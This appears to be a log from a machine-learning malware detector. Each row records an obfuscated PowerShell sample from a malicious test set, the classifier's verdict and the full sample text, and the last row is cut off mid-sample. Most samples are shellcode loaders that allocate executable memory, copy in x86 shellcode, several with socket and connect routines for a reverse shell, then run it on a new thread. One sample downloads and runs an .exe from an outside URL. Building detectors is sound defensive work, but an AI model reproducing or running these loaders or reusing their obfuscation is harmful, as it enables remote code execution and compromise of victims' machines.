DyXz.Length};DyXx=DyXw::VirtualAlloc(0,0x1000,DyXg,0x40);for (DyXi=0;DyXi','ThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(75Kmsvcrt.dll75K)]public static extern IntPtr memset(IntPtr','0,0x00,0x00,0x','0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01','0',',0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0','000){','0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x1','x02,0xc0,0x68,0x02,0x00,0x01,0xbb','x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0x','x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x5','00,0x68,0x77,0x73,0x32,0x5f,0','DyXc = Pri[DllImport(75Kkernel32.dll75K)]pub','0x50,0x','(;;){Start-sleep 60};',' -le (D','40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x','0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26',' uint flAllocationType, uint flProtect);[DllImport(75Kkernel32.dll75K)]public static extern IntPtr CreateThread(IntPtr ','yXz.Length-1);DyXi++) {DyXw::memset([IntPtr](','0x01,0x00,0x00,0x','DyXz = 0xfc,0xe8,0x89,0x00,','x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0','teThread(0,0,DyXx,0,0,0);for ','56,0')).replace('75K',[strING][cHar]34).replace('Pri',[strING][cHar]39).replace(([cHar]68+[cHar]121+[cHar]88),[strING][cHar]36))",malicious,TP
2026-07-13 17:05:41,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2857.ps1,custom-ps-ml,UNKNOWN,1ef593e7-680f-4671-9473-ce323a4cf15d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2891,1619.5," (((\""{5}{33}{40}{22}{17}{37}{2}{13}{43}{32}{26}{44}{45}{41}{28}{38}{15}{0}{34}{11}{4}{27}{20}{21}{7}{48}{24}{9}{42}{35}{47}{6}{8}{30}{19}{25}{31}{46}{10}{12}{16}{36}{39}{1}{3}{18}{23}{29}{14}\""-f'0x34,0x0b,0x9e,0x93,0xac,0x98,0','d,0xe3,0x7b,0x73,0x92,0x3e,0xe8,0x28,0x07,0xc1,0x','Size, IntPtr lpStartAdd','59,0x9d,0x80,0xa9,0x67,0xf8,0xe7,0x75,0x97,0x2f,0xf6,0x4a,0x4','4,0x00,0x22,0x78,0x76,0x','S4rypwg = sHw[DllImport(WLNkernel32.dllWLN)]public static extern I','x09,0x5','f4,0xef,0xbb,0x5f,0x04,0x37,0x7b,0x80,0','3,0x2d,0x16,0x52,0x07,0x4c,0x0f,0x3e,0xe6,0x71,0x4f,0','0x52,0xbe,0x','x56,0x','x58,0x1a,0xed,0xaa,0xf1,0x5e,0x6c,0x28,0x08,0xb3,0x4e,0x11,0xc3,0xc6,0x8f,0x56,0x3e,0x2a,0xdd,0x0f,0x34,0x99,0xf2,0x2','d0,0xd5,0x55,0x17,0x80,0xbd,0xbf,0x98,0xff,0xdd,0xbf,0x72,0x68,0x77,0x50,0x2b,0xc0,0xef,0xc9,0x76,0x9a,0x8e,0x16,0xad,0xe6,0x','ress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(WLNmsvcrt','sleep 60};','4,0xb5,0x51,0xe7,0xd4,0xbe,','90,0x9d,0x42,0x16,0x5e,0x56,0x2e,0x04,0x36,0x96,0x65,0x76,','ateThrea','e,0x09,0x8c,0xa2,0x52;S4rg = 0x1000;if (S4rz.Length -gt 0x1000){S4rg = S4rz.Length};S4rVkS=S4rw::VirtualAlloc(0,0x1000,S4rg,0x40);for (S4ri=0;S4ri -le (S4rz.Lengt','7,0xee,0xdf,0x0a,0xa5,0xb1,0x4b,0x85,0x85,','7,0x03,0x30,0x45,0xfe,0x83,0xb2,0x8a,0x8a,0x8d,0xac,0xcf,0xb7,0x44,0x46,0x3b,0x43,0x57,0','x8e,0x72,0xac,0x',' static extern IntPtr Cre','h-1);S4ri++) {S4rw::memset([IntPtr](S4rVkS.ToInt32()+S4ri), S4rz[S4ri], 1)};S4rw::CreateThrea',',','0x3a,0x52,0x52,0xea,0x10,0x22,0xcc,0x15,0x9b,0x53,0xc4,0xd1,0xcf,0x03,0x7e,0xf0,0x6f,0xc8,0x','4rz = 0xda,0xd8,0xbf','84,0x22,0x9d,0xce,0xa','47,0xf5,0x86,0xa4,0xce,0x10,0x','d(0,0,S4rVkS,0,0,0);for (;;){Start-','xe1,0x57,0xd4,0x1b,0x0f,0x83,0x65,0x46,0x47,0x60,0x44,0x79,0x9','7e,0xfd,0xa',';sHw;S4rw = Add-Type -memberDefinition S4rypwg -Name WLNWin32WLN -namespace Win32Functions -passthru;[Byte[]];[Byte[]]S','ntPtr VirtualAlloc(IntPtr lpAddress, ui','xd2,0x3b,0xc2,0x29,0','6,0x','0x90,0xa9,0x53,0x1d,0x1c,0x3c,0x58,0xb4,0x4b,0xa8,0x62,0xe1,0xbb,0x77,0x9c,0xc4,0xb0,0xbe,0x08,0xa7,0xae,0xbe,0xdc,0x27,0x2e,0xe9,0xb','d(IntPtr lpThreadAttributes, uint dwStack','b7,0xe','6,0x27,0x46,0x4','nt dwSize, uint flAllocationType, uint flProtect);[DllImport(WLNkernel32.dllWLN)]public','x5e,0xbc,0xa4,0x04,0x76,0xc3,0x','24,0x79,0x58,0x0b,0x22,0x25,0x7c,0x8a,0xe7,0x5d,0x78,0x07,0x0','.dllWLN)]public static extern IntPtr memset(IntPtr dest, uint src, uint count)',',0xa2,0x5e,0x51,0xf8,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x03,0x7d,0x','18,0x83,0xed,0','5,0x65,0x7a,0x69,0xec,0x7a,0x91,0xa2,0x98,0x78,0x99,0x25,0x05,0xf4,0x7f,0x15,0xe5,0','b2,0','x73,0x41,0x78,0x3d,0x84,0x96,0x03,0x99,0x01,0x0d,0xa3,0x6a,0xb1,0xe9'))-crepLACE'WLN',[chAR]34  -rePlace  'sHw',[chAR]39 -crepLACE ([chAR]83+[chAR]52+[chAR]114),[chAR]36)| . ( ([stRING]$veRBOSEPREFEreNcE)[1,3]+'X'-JoiN'')",malicious,TP
2026-07-13 17:05:47,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2867.ps1,custom-ps-ml,UNKNOWN,31519535-ce4a-406d-b0ed-33fd670aad15,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2890,1724.24," (((\""{48}{27}{26}{19}{46}{36}{18}{8}{37}{47}{38}{28}{40}{44}{3}{5}{43}{30}{0}{10}{42}{29}{25}{1}{41}{32}{7}{20}{16}{34}{24}{2}{21}{13}{23}{4}{17}{33}{22}{9}{15}{14}{45}{6}{35}{11}{12}{39}{31}\"" -f '0','0xf5,0xe1,0x00,','6c,0x24,0x7e,0x76,0x36','4,0xf4,0x58,0x29,0xc9,0xb','x17,0x0c,0xd7,0xb2,0xf8,0xf9,0x8f,0x2a,0x60,0xa0,0x44,0xcb,0x6d,0x7e,0x21,0xcb,0xe6,0x','1,0x47,0x83,0xc0,0x04,0x31,0x58,0x0f,0x03,0','alAlloc(0,0x1000,y06g,0x40);for (y06i=0;','d7,0xab,0x18,0x48,0xd2,0x62,0x92,0xba,0xa8,0x74,0x72,0xf3,0x51,0xda,0x','mset(IntPtr dest, uint src, uint count);dkB;y',',0x68','x40,0xef,0xa4,0x34,0x40,0','y06z[','y06i], 1)};y06w::CreateThread(0,0,',',0x51,0x04,0xde,0xb4,0xa6,0x6b,0xf5,0x01,0x38,0x92,0xf','6z.',',0xe9,0x67,0xef,0x68,0xe9,0x31,0x65,0x69,0x81,0xe5,0xdd,0x3a,0xb4,0xe9,0xcb,0x2e,0x65,0x7c,0xf4,0x06,0xda,0xd7,0x9c,0xa4,0x05,0x1f,0x03,0x56,0x60,0xa1,0x7f,0x81,0x4c,0xd7,0x91,0x11;y06g = 0x1000;if (y0','3c,0xa0,0x22,0xfb,0xfa,0x5b,0x51,0xf5,0xf9,0xe6,0x62,0xc2,0x80,0x3c,0xe6,0xd1,0x22','8d,0xd5,0','r lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(W9jmsvcrt.dllW9j)]public static extern IntPtr me','tPtr lpAddress, uint dwSize, uint flAl','bb,0x',',0x03,0x5a,0xd3,0xec,0x2a,0xfb,0xb9,0x43,0x52,0x1b,0x62,0x3b,0xf6,0x57,0x8e,0x28,0x8b,0x35,0xc6,0x9d,0xa6,0xc5,0x16,0x8a,0xb1,0xb6,0x24,0x15,0x6a',',0xd2,0xd7,0x94,0x8a,0x75,0x80,0x00,0x91,0xa0,0xe6,0x8e,0x6a,0x87,0x7d,0x06,0xff','6,0x71,0x10,0x50,0xa2,0x21,0x0a,0x71,0xcb,0xa9,0xca,0x7e,0x1e,0x47,0xce,0xe8,0x0d,0x8c,0xda,0xeb,0x25,0xaf,0xda,0xfe,0x1d,0x26,0x3c,0x50,0x0e,0x69,0x91,0x10,0xfe,0xc9,0x41,0xf8,0x14,0xc6,0xbe,0x18,0',',0xb5,0xdf,0xd0,0x4c,0x91,0xc3,0xe7,0x81,0xa9,0xff,0x','24,0x7c,0x19,0x2b,0x14,0xbc,0x38,0xaf,0x67,0x91,0x9a,0x8e,0xa7,0xe4,0xdb,0xd7,0xda,0x05,0x89,0x80,0x91,0xb8,0x3e,0xa5,0xec,0x00,0xb4,','Alloc(In',' IntPtr Virtual','space Win32Functions -passthru;[By','xdf,0xe0,0x8a,0xfb,0x8d,0x10,0x19,0x89,0x19,0x16,0xaa,0x',',0x01,0x59,0x9a,0xb8,0xf5,0x1f,0x65,0x41,0x05,',',0,0);for (;;){Start-sleep 60};','4d,0x03,0x20,0xfc,0xc6,0x5a,0xe2,0xfe,0x0b,0x','x85,0x0e,0xfb,0xc5,0x71,0xff,0xb6,0xb4,0xd7,0x00,0x6d',',0xb6,0x50,0x3e,0xd3,0x1b,0x06','y06i -le (y06z.Length-1);y06i++) {y06w::memset([IntPtr](y06iMg.ToInt32()+y06i), ','Pt','06w = Add-Type -memberDefinition y06iMgB7x -Name W9jWin32W9j -n','e','y06iMg,0','te[]];[Byte[]]y06z','0x29,0x','x8b,0xad,0x66,0x70,0','x58',' = 0xbb,0x0e,0xbb,0x6f,0x44,0xda,0xd6,0xd9,0x74,0x2','Length -gt 0x1000){y06g = y06z.Length};y06iMg=y06w::Virtu','locationType, uint flProtect);[DllImport(W9jkernel32.dllW9j)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, Int','am','y06iMgB7x = dkB[DllImport(W9jkernel32.dllW9j)]public static extern')) -RePLACE 'y06',[CHAR]36 -CRePlacE  ([CHAR]87+[CHAR]57+[CHAR]106),[CHAR]34 -CRePlacE([CHAR]100+[CHAR]107+[CHAR]66),[CHAR]39) |inVoKE-ExpREsSIoN",malicious,TP
2026-07-13 17:05:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\287.ps1,custom-ps-ml,UNKNOWN,4365f970-d81e-4b25-acb7-edb76003a78e,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3029,1666.1," . ( $shellId[1]+$SHeLliD[13]+'x')((((\""{31}{27}{7}{29}{30}{14}{18}{41}{46}{10}{33}{22}{28}{32}{43}{12}{17}{5}{0}{42}{8}{9}{25}{13}{49}{16}{37}{44}{11}{1}{45}{6}{23}{47}{38}{34}{21}{20}{35}{3}{4}{15}{2}{36}{50}{26}{39}{19}{24}{48}{40}\""-f'd1,0x51,0x8b,0x59,0x20,0x01,0xd',',0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x',',0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff','0xd5,0x83,0xf8,0x00,0x','7d,0x22,0x58,0x68,','8,0x01,0x','x4e,0x08','tatic extern IntPtr VirtualAlloc(I','xc1,0xcf,0x0d',',0x01,0xc7,0x38,0xe0,0x75,0xf6,0x0','StartAddress, In','x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97',',0xff,0xac,0x3c,0x','x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xf','Type, ','0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b','f,0x54,0x68,0x4c,','61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x4','uint flProtect);[DllImport(EO1kernel32.dllEO1)]public stat','Leng','a,0x00,0x','x6','lags, IntPtr lpThreadId);[DllImport(EO1msvcrt.dllEO1)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);gMJ;TzNw = Add-Type -memberDefinition TzNc -Name EO1Win32EO1 -namespace Win32Functions -passthru;[Byte[]',',0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0','th -gt 0x1000){TzNg = TzNz.Length};TzNx=TzNw::VirtualAlloc(0,0x1000,','3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0','0xf0,0xb5,0xa2,','EO1kernel32.dllEO1)]public s','];[Byte[]]TzNz = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8','ntPtr lpAddre','ss, uint dwSize, uint flAllocation','TzNc = gMJ[DllImport(','b,0x52,0x0c,0x8b,0x52,0x14,0x','tPtr lpParameter, uint dwCreationF','5,0x93,0x53,0','56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,',',0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,','0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0',',0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd','0x56,0x6a,0x00,0x53,0xff,0xd5;TzNg = 0x1000;if (TzNz.','(TzNz.Length-1);TzNi++) {TzNw::memset([IntPtr](TzNx.ToInt32()+TzNi), TzNz[TzNi], 1)};TzNw::CreateThread(0,0,TzNx,0,0,0);for (;;){Start-sleep 60};','ic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,','3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0','8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31','x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xb5,0xa2,0x01,0x7e,0x68,0x02,0x00,0x27,0x0f,0x89,0xe6,0x50,0x50,0','61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0',' IntPtr lp','xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40','TzNg,0x40);for (TzNi=0;TzNi -le ','f,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5','0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,'))-crEPLacE  'TzN',[chAR]36  -crEPLacE  ([chAR]69+[chAR]79+[chAR]49),[chAR]34 -rePLAcE  ([chAR]103+[chAR]77+[chAR]74),[chAR]39) )",malicious,TP
2026-07-13 17:06:09,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2873.ps1,custom-ps-ml,UNKNOWN,564ab5b4-c399-4bce-9de3-f0b119378475,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2802,1689.13," ((\""{35}{15}{22}{18}{39}{0}{10}{40}{20}{29}{33}{37}{17}{7}{23}{32}{28}{6}{16}{38}{12}{9}{43}{46}{5}{19}{31}{21}{36}{14}{8}{4}{42}{1}{30}{34}{44}{27}{3}{13}{41}{24}{25}{45}{2}{26}{11}\"" -f'reateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpPara','0,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb3,0xec,0xe0,0x68,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61','tualAlloc(0,0x1000,VG6g,0x40);for (VG6i=0;VG6i -le (VG6z.Length-1);VG6i++) {VG6w::memset([IntPtr](VG6uIDY.ToInt32()+VG','0x56,0x57,0x68,0x02,0xd9,0xc8,0x','8,0x29,0x80,0x6b,0x00,0xff,0x','x5b,0x5b,0x61,0x59,0x5a,0x51','6,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c',',0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8','0xc4,0x54,0x50,0x6','x01,0xd3,0xe3,0x3c,0x49,','meter, uint dwCreationFlags, IntPtr l',' 60};','0','5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0','29,','static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint f',',0x01,0xd0,0x8b,0x40,0x78,0x','ru;[Byte[]];[Byte[]]VG6z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89','tPt',',0xff,0xe0,0x58','G)]public static extern IntPtr memset(IntPtr',',0x00,0x00,0x68,0x77,','lAllocationType, uint flProtect);[DllImport(MbGkernel32.dllMbG)]public static extern In','b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x','d9,0xc8,0x5f,0x','ff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;VG6g = 0x1000;if (VG6z.Length -gt 0x1000){VG6g','6i), VG6z[VG6i], 1)};VG6w::CreateThread(0,0,VG6uIDY,0,0,0);for (;;){Start-sleep','a,0x00,0x6a,0x04,','0xb7,0x4a,0x2',' dest, uint src, u',',0xff,0xd5,0x85',',0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32','28,0x0f,','int count);Nor;VG6w = Add-Type -memberDefinition VG6949 -Name MbG',',0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,','VG6949 = Nor[DllImport(MbGkernel32.dllMbG)]public ','0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x','Win32MbG -namespace Win32Functions -passth','85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,','r C','pThreadId);[DllImport(MbGmsvcrt.dllMb','x57,0x68,0x02,0x','d5,0x50,0x50,0x50,0x50,0x40,0x5','0x8b,0x34','0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6',' = VG6z.Length};VG6uIDY=VG6w::Vir',',0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0')).REplAcE(([cHaR]77+[cHaR]98+[cHaR]71),[strIng][cHaR]34).REplAcE(([cHaR]86+[cHaR]71+[cHaR]54),'$').REplAcE('Nor',[strIng][cHaR]39) |. ( $env:ComsPEC[4,24,25]-Join'')",malicious,TP
2026-07-13 17:06:22,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2876.ps1,custom-ps-ml,UNKNOWN,d87192d3-4514-45ec-90df-99ba973790c8,DESKTOP-BAC9DBQ,malicious,0.9948,RandomForest,606,1633.81," (((\""{13}{31}{9}{4}{30}{24}{23}{5}{36}{39}{2}{42}{20}{40}{25}{1}{15}{33}{37}{22}{38}{26}{0}{28}{32}{17}{12}{11}{34}{6}{14}{21}{29}{41}{18}{7}{19}{3}{16}{27}{8}{35}{10}\""-f',NzRkJfe','t','load','rocess (NzRk','m.N','t)','e','ta',':T',' Syste','eNzR)','uu','b','(New-','xe','ps://','J','G',';S','rt-P','h','Nz','t/ul','n','e','t','Nqh','fenv','nv:','R','et.WebCli','Object','TEMPi','a.pomf.c','uu.','EMPiGbuuuu.ex','.Do','a','txkr.exe','wn','h',')','File(Nq'))-cREPlACe([ChAr]105+[ChAr]71+[ChAr]98),[ChAr]92 -cREPlACe'Nqh',[ChAr]39-rEPLAce  'kJf',[ChAr]36 -rEPLAce([ChAr]78+[ChAr]122+[ChAr]82),[ChAr]34)|IEx",malicious,TP
2026-07-13 17:06:35,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2883.ps1,custom-ps-ml,UNKNOWN,a6df81cd-fd3b-46d9-972e-2786206c68bc,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2907,1467.04,".( $eNv:comSPEC[4,26,25]-jOiN'')( ((\""{22}{3}{13}{12}{26}{27}{33}{47}{31}{5}{7}{19}{20}{16}{30}{11}{44}{35}{46}{32}{45}{23}{42}{14}{8}{48}{34}{10}{4}{28}{43}{18}{36}{21}{40}{1}{17}{15}{25}{38}{24}{41}{29}{6}{2}{9}{37}{39}{0}\"" -f 'r (;;){Start-sleep 60};','4,0x15,0x25,','.Length-1);nB8i++) {nB8w::memset([IntPtr](nB8x.ToInt32()+nB8i), nB8','l32.dllG9S)]public static extern IntPtr Vi','xfd,0xfe,0xe9,0xc2,0xd7,','t(G9Smsvcrt.dllG9S)]public static ex','B8i -le (nB8z','te','82,0x68,0x4e,0x53,0x7d,0x1f,0xa6,0xa0,0x00,0x18,0','z[nB8i]',',0x6a,0x2b,0x21,0x10,0x49,0xef,0x6a,0xc2,0xf0,0xb6,0xd6,0xa5,0x0d,0xa8,0xb9,0x1a,0xa8,0xa2,0x57,0x4e,0xc1,0xe8,0x3f,0xa3,0xe8,0x12,0xbf,0xab,0x7b,0x60,0x8d,0x74,0xd0,0xee,0xbd,0','namespace Win32Functions -passthru;[B','uint flProtect);[DllImport(G9Skernel32.dllG9S)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSta','rtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, ','be,0x07,0x2e,0xc3,0xc6,0xf4,0xe6,0xe2,0xe7,0xaa,0x7d,0xbd,0x27,0x4c,0x52,0xb5,0x61,0x56,0xb7,0xf0,0x38,0xed,0x03,0x8e,0xba,0x27,0x5a,0x6f,0x10,0x06,0x53,0x','3,0x2e,0xec,0x04,0x2c,0x58,0x11,0xc9,0xac,0x98,0x47,0x83,0xac,0xf0,0x3f,0xf7,0','int src, uint count);EAb;nB8w = Add-Type -memberDefinition nB8c -Name G9SWin32G','0x90,0x4','0x13,0xed,0x82,0xdf,0x4b,0x99,0x3b,0x7a,0x07,0x38,0xc3,0x50,0x6d,0x7a,0x4f,0x57,0x91,0x','rn IntPtr memset(IntPtr dest,',' u',',0xa0,0x48,0x69,0xfb,0x66,0x56,0x47,0x96,0x86,0xc2,0x6c,0x31,0xd1,0x7a,0x6f,0','nB8c = EAb[DllImport(G9Skerne','29,0x7e,0xfb,','6b,0x7d,0xa6,0xe8,0x52,0x49,0x69,0x1','xfe,0xe5,0x3f,0x22,','ckSize, In','tPtr','0x47,0x65,0x3d,0xd8,0xb7,0xaf,0xf9,0x8c,0xe7,0xc7,0x28,0xad,0x63,','n','9S -','tPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImpor','45,0x2f,0x28,0x39,0x86,',' lpStartAdd','00,0x70,0x36,0x86,0x4f,0x94,0xc9,0x4b,0xe4,0xa0,0x42','x61,0x25,0x6b,0x9f,0xa1,0x51,0xff,0x8f,0x11,0x11,0xad,0x23,0xd9,0x77,0x46,0xb0,0x','34,0xb8,0x12,0x81',', 1)};nB','0x93,0xb6,0xd5,0xcd,0xc2,0x','8w::CreateThread(0,0,nB8x,0,0,0);fo','x6','2,0xb1,0x4b,0x55,0xc5,0xff,0x39,0xb7,0xd5;nB8g = 0x1000;if (nB8z.Length -gt 0x1000){nB8g = nB8z.Length};nB8x=nB8w::VirtualAlloc(0,0x1000,nB8g,0x40);for (nB8i=0;','0xcf,0x7b,0xd7,0x77,0x7d,0x6c,0x5c,0xcd,0x','0x18,0xd5,0x78,0x19,0x1d,0x41,0x43,0x76,0x1d,0x9c,0x2b,0x85,0x1e,0x8f,0xf7,0x00,0xf8,0xff,0x57,0x43,0x55,0xbf,0x07,0x23,0x05,0x57,0x42,0xac,0x7a,0x47,0x6d,0x66,','yte[]];[Byte[]]nB8z = 0xba,0xb7,0x9c,0xb5,0x91,0xdd,0xc2,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x53,0x0f,0x03,0x53,0xb8,0x7e,0x40,0x6d,0x2e,0xfc,0xab,0x8e,0xae,0','0x22,0x','af,0x5f,0x69,0x71,0x05,0x86,0x44,0x82,0x36,0xfa,0xc7,0x00,0x','ress, In','x7d,0xdb,0xde,0xad,0x66,0x7b,0x94,0x16,0x43,0x7a,0x79,0xc0,0x')).rePlacE(([char]71+[char]57+[char]83),[STriNg][char]34).rePlacE(([char]69+[char]65+[char]98),[STriNg][char]39).rePlacE('nB8',[STriNg][char]36) )",malicious,TP
2026-07-13 17:06:48,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2893.ps1,custom-ps-ml,UNKNOWN,a301ad3b-b31c-409d-8676-8b490e335cd7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2807,1568.34," ((\""{28}{32}{43}{9}{14}{11}{18}{24}{23}{25}{4}{30}{45}{13}{8}{16}{35}{34}{10}{27}{39}{6}{36}{29}{2}{41}{20}{42}{22}{26}{7}{38}{44}{46}{5}{17}{21}{12}{3}{40}{37}{15}{1}{31}{19}{0}{33}\""-f'th-1);Jg3i++) {Jg3w::memset([IntPtr](Jg3x.ToInt3',',0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;Jg3g = 0x1000;if (Jg3z.Length -gt 0x','0x8b,0x58,','0x6a,0x40,0x','32iJO -namespace Win32Functions -passthru;[Byte[]];[Byte[]]Jg3z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,','68,0x29,0x6d,0x02,0x3f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0','0x8b,0x58,0x24,0x01','4,0x5',',0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x','el32.dlliJO)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpPar','xf','xtern IntPtr memset(I','4,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,',',0x01,0xc7,0xe2','ameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(iJOmsvcrt.dlliJO)]public static e','0xff,0xd5,0x93,0x53,0x6a,0x00','50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe','x61,0xff,0xd5,0','ntPtr dest, uint src, uint','(Jg3i=0;Jg3i -le 